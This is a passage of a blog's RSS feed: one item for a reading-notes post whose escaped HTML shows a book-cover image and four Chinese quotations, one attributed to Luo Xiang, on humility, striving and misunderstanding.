      <link>http://localhost:1313/posts/read_fzdxj/</link>
      <pubDate>Wed, 06 Aug 2025 16:42:15 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_fzdxj/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/fazhidexijie/1.jpg&#34; title=&#34;/img/fazhidexijie/1.jpg&#34; data-thumbnail=&#34;/img/fazhidexijie/1.jpg&#34; data-sub-html=&#34;&lt;h2&gt;/img/fazhidexijie/1.jpg&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/fazhidexijie/1.jpg&#39; alt=&#34;/img/fazhidexijie/1.jpg&#34; height=&#34;500px&#34; width=&#34;400px&#34;&gt;&lt;/a&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“为什么人很容易飘飘然？因为你浅薄呀  浅薄的东西就是容易飘起来” ——罗翔&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;hr&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“我们画不出那个完美的圆，但是我们仍然应当努力，虽不能至心向往之”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;hr&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“我们每个人都并不优越于他人，每个人都是有限的。我们时常需要聆听苏格拉底的德尔菲神谕，承认自己的无知和有限，渺小和幽暗”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;hr&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“本质上，过分的夸奖与过分的批评不都是误解吗？误解本来就是人生常态，不要喜欢好听的误解，而厌恶不好听的误解。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
  </channel>
</rss>
